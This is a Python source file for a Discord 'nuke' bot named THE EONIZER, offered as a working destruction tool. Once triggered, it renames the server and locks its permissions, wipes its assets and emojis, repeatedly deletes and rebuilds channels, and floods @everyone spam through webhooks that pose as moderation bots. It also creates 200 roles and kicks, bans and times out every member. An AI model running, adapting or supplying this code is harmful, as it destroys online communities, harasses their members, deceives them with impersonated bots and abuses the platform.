"""
raid.py — THE EONIZER | Raw destruction engine.

WHY FEEDERS NOT PER-CHANNEL LOOPS:
  Old approach: 1 coroutine per channel + 1 per webhook = 900+ active coroutines.
  When the event loop is saturated with 900 coroutines all doing async I/O,
  incoming slash commands (like /stop) can't be scheduled within Discord's
  3-second window → "Application did not respond".

  New approach: 2 feeder coroutines total that continuously push ALL webhook URLs
  and ALL channel IDs into the 100-thread HTTP queue. The threads do all actual
  network work. The event loop stays nearly idle → /stop responds instantly every time.

PHASES (all run concurrently from _launch):
  _rename_server        — rename + lock @everyone
  _wipe_assets          — remove icon, banner, description, stickers
  _wipe_emojis          — DELETE all custom emojis via queue
  _channel_loop         — true non-stop: delete → rebuild → spam → repeat
  _role_flood           — POST 200 raid roles via queue
  _member_ops           — kick + ban + timeout + nick all members via queue
"""

import asyncio
import datetime
import random
import string

import discord
import requests
from discord import app_commands
from discord.ext import commands

from utils.http_queue import HttpQueue, API_BASE
from utils.state import bot_state

RAID_TAG         = "THE EONIZER"
RAID_NAME        = "NUKED BY EON | THE EONIZER"
RAIDER           = "EoN"
CREATE_PER_CYCLE = 100   # channels per nuke cycle (100 = faster rebuild)
WEBHOOKS_PER_CH  = 3    # webhook URLs per channel (3 × 100 = 300 parallel streams)
NUKE_LOOP_WAIT   = 45   # seconds of spam before next nuke cycle
_WH_CREATE_SEM   = asyncio.Semaphore(20)

_MSGS = [
    f"@everyone 💀 **{RAID_NAME}** 💀",
    f"@everyone ☠️ {RAIDER} | THE EONIZER WAS HERE ☠️",
    f"@everyone 🔥 YOUR SERVER IS BEING NUKED BY {RAIDER} 🔥",
    f"@everyone ⚔️ {RAID_NAME} ⚔️",
    f"@everyone 💥 OBLITERATED BY {RAIDER} | THE EONIZER 💥",
    f"@everyone 👑 {RAIDER} OWNS THIS SERVER | THE EONIZER",
    f"@here 💀 {RAID_NAME}",
    f"@here ☠️ {RAIDER} NUKE IN PROGRESS | THE EONIZER",
    f"@here 🎯 {RAID_NAME}",
]

_WH_NAMES = [
    "Server Announcement", "Mod Alert", "AutoMod",
    "Carl-bot", "MEE6", "Wick",
    "EoN Alpha", "EoN Reaper", "EoN Ghost",
    "EoN", "The Eonizer",
]

_ROLE_NAMES = [
    "☠️ NUKED BY EoN", "💀 THE EONIZER", "🔥 NUKED BY EON",
    "⚔️ EON OWNS YOU", "💥 OBLITERATED", "👑 EON WAS HERE",
    "🚨 NUKED BY THE EONIZER", "⚠️ SERVER COMPROMISED",
    "🔴 EON NUKE", "💣 EoN | THE EONIZER",
]

_NICKS = ["NUKED", "EON Was Here", "GG no re", "PWNED", "EoN", RAID_TAG]

_CH_OPTS = [
    "nuked-by-eon-{i}",
    "the-eonizer-{i}",
    "eon-owned-{i}",
    "eon-nuke-{i}",
    "eonizer-{i}",
]

_ROLE_COLORS = [
    0xFF0000, 0x8B0000, 0xFF6600, 0xFF4500,
    0x800080, 0x4B0082, 0xFF1493, 0xDC143C,
]


def _rand(n: int = 4) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _ch_name(i: int = 0) -> str:
    return random.choice(_CH_OPTS).format(i=i)


def _msg() -> str:
    return random.choice(_MSGS)


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /testperms ─────────────────────────────────────────────────────────────
    @app_commands.command(name="testperms", description="Check bot permissions in this server.")
    @app_commands.guild_only()
    async def testperms(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        me    = guild.me
        p     = me.guild_permissions
        lines = [
            f"**Bot permission check — {guild.name}**",
            f"Administrator    : {'✅' if p.administrator else '❌'}",
            f"Manage Guild     : {'✅' if p.manage_guild else '❌'}",
            f"Manage Channels  : {'✅' if p.manage_channels else '❌'}",
            f"Manage Roles     : {'✅' if p.manage_roles else '❌'}",
            f"Manage Webhooks  : {'✅' if p.manage_webhooks else '❌'}",
            f"Ban Members      : {'✅' if p.ban_members else '❌'}",
            f"Kick Members     : {'✅' if p.kick_members else '❌'}",
            f"Moderate Members : {'✅' if p.moderate_members else '❌'}",
            f"",
            f"Bot top role     : `{me.top_role.name}` (pos {me.top_role.position})",
        ]
        await interaction.followup.send("\n".join(lines), ephemeral=True)

    # ── /testcreate ────────────────────────────────────────────────────────────
    @app_commands.command(name="testcreate", description="Try to create one test channel.")
    @app_commands.guild_only()
    async def testcreate(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        try:
            ch = await asyncio.wait_for(
                guild.create_text_channel("eon-test-channel"), timeout=15.0
            )
            await interaction.followup.send(
                f"✅ **Channel creation WORKS.** Created: <#{ch.id}>", ephemeral=True
            )
            try:
                await ch.delete()
            except Exception:
                pass
        except asyncio.TimeoutError:
            await interaction.followup.send(
                "❌ **TIMEOUT** — channel creation hung 15s.\n"
                "• Guild at 500-channel cap\n"
                "• Discord rate-limiting (wait 10–15 min)",
                ephemeral=True,
            )
        except discord.Forbidden as e:
            await interaction.followup.send(f"❌ **403 FORBIDDEN** — `{e}`", ephemeral=True)
        except discord.HTTPException as e:
            await interaction.followup.send(f"❌ **HTTP {e.status}** — `{e.text}`", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ `{type(e).__name__}: {e}`", ephemeral=True)

    # ── shared launch ──────────────────────────────────────────────────────────
    async def _launch(
        self,
        guild: discord.Guild,
        invoker_id: int,
        reply,
        hub_id: int | None = None,
    ) -> None:
        if bot_state.active_simulation:
            await reply(f"⚠️ **{bot_state.active_simulation}** is running — use `.stop` or `/stop` first.")
            return

        if not guild.me.guild_permissions.manage_channels and not guild.me.guild_permissions.administrator:
            await reply("❌ Missing **Manage Channels** — run `/testperms`.")
            return

        bot_state.reset()
        bot_state.active_simulation = "raid"

        protected_ids: set[int] = {hub_id} if hub_id else set()

        try:
            await reply(
                f"☠️ **{RAID_TAG} — NUKE LAUNCHED** ☠️\n"
                f"┣ DELETE all channels + roles + emojis simultaneously\n"
                f"┣ REBUILD {CREATE_PER_CYCLE} flood channels × {WEBHOOKS_PER_CH} webhooks\n"
                f"┣ BAN + KICK + TIMEOUT all members at once\n"
                f"┣ SPAM — maximum pings — loops non-stop\n"
                f"┗ `/stop` or `.stop` to halt."
            )
        except Exception:
            pass

        bot_state.add_task(asyncio.create_task(self._rename_server(guild)))
        bot_state.add_task(asyncio.create_task(self._wipe_assets(guild)))
        bot_state.add_task(asyncio.create_task(self._wipe_emojis(guild)))
        bot_state.add_task(asyncio.create_task(self._channel_loop(guild, protected_ids)))
        bot_state.add_task(asyncio.create_task(self._role_flood(guild)))
        bot_state.add_task(asyncio.create_task(self._member_ops(guild, invoker_id)))

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(name="raid", description=f"☠️ Full destruction — {RAID_TAG}. Runs until /stop.")
    @app_commands.guild_only()
    async def raid(self, interaction: discord.Interaction) -> None:
        # ── RESPOND IMMEDIATELY — before ANY async work ────────────────────
        # This is the permanent fix for "Application did not respond".
        # interaction.response.send_message() is synchronous-dispatched and
        # always satisfies Discord's 3-second window, no matter what else is running.
        await interaction.response.send_message(
            "☠️ **NUKE SEQUENCE INITIATED** — launching...", ephemeral=True
        )

        guild = interaction.guild

        # Create protected control hub AFTER interaction is already answered
        hub: discord.TextChannel | None = None
        hub_id: int | None = None
        try:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(
                    read_messages=False, send_messages=False,
                ),
                guild.me: discord.PermissionOverwrite(
                    read_messages=True, send_messages=True,
                ),
            }
            hub = await asyncio.wait_for(
                guild.create_text_channel("eon-control", overwrites=overwrites),
                timeout=10.0,
            )
            hub_id = hub.id
            print(f"[raid] control hub created: #{hub.id}", flush=True)
        except Exception as e:
            print(f"[raid] hub creation failed (no hub): {e}", flush=True)

        reply = hub.send if hub else interaction.followup.send
        await self._launch(guild, interaction.user.id, reply, hub_id=hub_id)

    # ── .raid ──────────────────────────────────────────────────────────────────
    @commands.command(name="raid")
    @commands.guild_only()
    async def raid_prefix(self, ctx: commands.Context) -> None:
        await ctx.send("☠️ NUKE SEQUENCE INITIATED — launching...")
        await self._launch(ctx.guild, ctx.author.id, ctx.send)

    # ─────────────────────────────────────────────────────────────────────────
    # RENAME + LOCK
    # ─────────────────────────────────────────────────────────────────────────
    async def _rename_server(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(name=RAID_NAME)
            print("[raid] server renamed OK", flush=True)
        except Exception as e:
            print(f"[raid] rename FAILED: {e}", flush=True)
        try:
            await guild.default_role.edit(permissions=discord.Permissions.none())
            print("[raid] @everyone locked OK", flush=True)
        except Exception as e:
            print(f"[raid] lock @everyone FAILED: {e}", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # WIPE SERVER ASSETS
    # ─────────────────────────────────────────────────────────────────────────
    async def _wipe_assets(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(
                description=f"NUKED BY {RAID_TAG} | EoN",
                icon=None,
                banner=None,
            )
            print("[raid] server assets wiped OK", flush=True)
        except Exception as e:
            print(f"[raid] asset wipe FAILED: {e}", flush=True)
        for sticker in list(guild.stickers):
            try:
                await sticker.delete()
            except Exception:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # EMOJI WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _wipe_emojis(self, guild: discord.Guild) -> None:
        q = HttpQueue.get()
        emojis = list(guild.emojis)
        if not emojis:
            return
        for e in emojis:
            q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/emojis/{e.id}")
        await q.join()
        print(f"[raid] wiped {len(emojis)} emojis", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # WEBHOOK SPAM FEEDER
    # Single coroutine that feeds ALL webhook URLs into the HTTP queue in a
    # tight loop. 100 threads fire them simultaneously. Event loop stays free.
    # ─────────────────────────────────────────────────────────────────────────
    async def _webhook_spam_feeder(self, webhook_urls: list[str]) -> None:
        q   = HttpQueue.get()
        se  = bot_state.stop_event
        mentions = {"parse": ["everyone", "roles"]}
        try:
            while not se.is_set():
                for url in webhook_urls:
                    if se.is_set():
                        return
                    q.put_webhook(url, {
                        "content": _msg(),
                        "username": random.choice(_WH_NAMES),
                        "allowed_mentions": mentions,
                    })
                # Yield to event loop so /stop is always processed instantly
                await asyncio.sleep(0)
        except asyncio.CancelledError:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # CHANNEL SPAM FEEDER
    # Single coroutine queuing @everyone to every channel via bot token HTTP queue.
    # ─────────────────────────────────────────────────────────────────────────
    async def _channel_spam_feeder(self, channel_ids: list[int]) -> None:
        q  = HttpQueue.get()
        se = bot_state.stop_event
        try:
            while not se.is_set():
                for ch_id in channel_ids:
                    if se.is_set():
                        return
                    q.put(
                        requests.post,
                        f"{API_BASE}/channels/{ch_id}/messages",
                        {
                            "content": _msg(),
                            "allowed_mentions": {"parse": ["everyone", "roles"]},
                        },
                    )
                await asyncio.sleep(0)
        except asyncio.CancelledError:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # CONTINUOUS NUKE LOOP — true non-stop
    #   Each cycle: delete all → rebuild channels → create webhooks → spam → repeat
    # ─────────────────────────────────────────────────────────────────────────
    async def _channel_loop(
        self,
        guild: discord.Guild,
        protected_ids: set[int] | None = None,
    ) -> None:
        se         = bot_state.stop_event
        q          = HttpQueue.get()
        _protected = protected_ids or set()
        cycle      = 0

        try:
            while not se.is_set():
                cycle += 1
                print(f"[nuke] ── cycle {cycle} start ──", flush=True)

                # ── Phase A: DELETE all unprotected channels ───────────────
                existing = [ch for ch in guild.channels if ch.id not in _protected]
                print(f"[nuke] queuing {len(existing)} deletes (protected: {len(_protected)})", flush=True)
                for ch in existing:
                    q.put(requests.delete, f"{API_BASE}/channels/{ch.id}")

                delete_wait = max(4.0, len(existing) * 0.12)
                await asyncio.sleep(delete_wait)
                if se.is_set():
                    return
                await asyncio.sleep(1.5)  # let gateway process CHANNEL_DELETE events

                # ── Phase B: CREATE flood channels ────────────────────────
                _create_sem         = asyncio.Semaphore(2)
                created_channels: list[discord.TextChannel] = []

                async def _create_one(i: int) -> None:
                    if se.is_set():
                        return
                    async with _create_sem:
                        if se.is_set():
                            return
                        try:
                            ch = await asyncio.wait_for(
                                guild.create_text_channel(
                                    _ch_name(i),
                                    topic=f"NUKED BY {RAID_TAG}",
                                ),
                                timeout=15.0,
                            )
                            created_channels.append(ch)
                        except Exception as e:
                            print(f"[nuke] create failed: {e}", flush=True)

                print(f"[nuke] creating {CREATE_PER_CYCLE} channels...", flush=True)
                await asyncio.gather(
                    *[_create_one(i) for i in range(CREATE_PER_CYCLE)],
                    return_exceptions=True,
                )
                print(f"[nuke] created {len(created_channels)} channels", flush=True)

                if se.is_set():
                    return

                # ── Phase C: CREATE webhooks (concurrent, separate sem) ───
                webhook_urls: list[str] = []

                async def _make_webhook(ch: discord.TextChannel) -> None:
                    for _ in range(WEBHOOKS_PER_CH):
                        if se.is_set():
                            return
                        async with _WH_CREATE_SEM:
                            if se.is_set():
                                return
                            try:
                                wh = await asyncio.wait_for(
                                    ch.create_webhook(name=random.choice(_WH_NAMES)),
                                    timeout=10.0,
                                )
                                webhook_urls.append(wh.url)
                            except Exception:
                                pass

                await asyncio.gather(
                    *[_make_webhook(ch) for ch in created_channels],
                    return_exceptions=True,
                )
                print(f"[nuke] {len(webhook_urls)} webhook URLs ready", flush=True)

                if se.is_set():
                    return

                # ── Phase D: START SPAM FEEDERS ───────────────────────────
                # 2 coroutines replace 900+ individual spam loops.
                # HTTP queue threads do all the actual network work.
                channel_ids = [ch.id for ch in created_channels]
                spam_tasks: list[asyncio.Task] = []

                if webhook_urls:
                    t = asyncio.create_task(self._webhook_spam_feeder(webhook_urls))
                    spam_tasks.append(t)
                    bot_state.add_task(t)

                if channel_ids:
                    t = asyncio.create_task(self._channel_spam_feeder(channel_ids))
                    spam_tasks.append(t)
                    bot_state.add_task(t)

                print(
                    f"[nuke] spam launched — {len(webhook_urls)} webhook streams "
                    f"+ {len(channel_ids)} channel streams via 100-thread queue",
                    flush=True,
                )

                # ── Phase E: WAIT, then loop ──────────────────────────────
                for _ in range(NUKE_LOOP_WAIT * 10):
                    if se.is_set():
                        break
                    await asyncio.sleep(0.1)

                # Cancel spam feeders before next nuke cycle
                for t in spam_tasks:
                    t.cancel()
                await asyncio.gather(*spam_tasks, return_exceptions=True)

                print(f"[nuke] cycle {cycle} complete — looping", flush=True)

        except asyncio.CancelledError:
            q.clear()
            print("[nuke] channel_loop cancelled", flush=True)
        except Exception as e:
            print(f"[nuke] channel_loop CRASH: {type(e).__name__}: {e}", flush=True)
        finally:
            print("[nuke] channel_loop exiting", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # ROLE FLOOD
    # ─────────────────────────────────────────────────────────────────────────
    async def _role_flood(self, guild: discord.Guild) -> None:
        q  = HttpQueue.get()
        se = bot_state.stop_event
        for i in range(200):
            if se.is_set():
                break
            q.put(
                requests.post,
                f"{API_BASE}/guilds/{guild.id}/roles",
                {
                    "name": f"{random.choice(_ROLE_NAMES)} {i}",
                    "color": random.choice(_ROLE_COLORS),
                    "permissions": "0",
                },
            )
        if not se.is_set():
            await q.join()
        print("[role] role flood done", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # MEMBER OPS
    # ─────────────────────────────────────────────────────────────────────────
    async def _member_ops(self, guild: discord.Guild, invoker_id: int) -> None:
        se = bot_state.stop_event
        print("[raid] member_ops: chunking...", flush=True)
        try:
            await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
        except Exception as e:
            print(f"[raid] chunk error: {e}", flush=True)

        if se.is_set():
            return

        me = guild.me
        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != invoker_id
            and m.id != me.id
            and m.top_role < me.top_role
        ]
        print(f"[raid] queuing ops on {len(targets)} members", flush=True)

        q = HttpQueue.get()
        timeout_until = (
            datetime.datetime.utcnow() + datetime.timedelta(days=28)
        ).strftime("%Y-%m-%dT%H:%M:%S.000Z")

        for m in targets:
            if se.is_set():
                break
            q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/members/{m.id}")
            q.put(
                requests.put,
                f"{API_BASE}/guilds/{guild.id}/bans/{m.id}",
                {"delete_message_days": 0},
            )
            q.put(
                requests.patch,
                f"{API_BASE}/guilds/{guild.id}/members/{m.id}",
                {
                    "communication_disabled_until": timeout_until,
                    "nick": random.choice(_NICKS),
                },
            )

        if not se.is_set():
            await q.join()
        print("[raid] member_ops done", flush=True)

    # ── error handlers ─────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        msg = (
            "❌ You need **Administrator** permission."
            if isinstance(error, app_commands.MissingPermissions)
            else f"❌ {error}"
        )
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass

    @testperms.error
    @testcreate.error
    async def test_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        try:
            await interaction.response.send_message(f"❌ {error}", ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
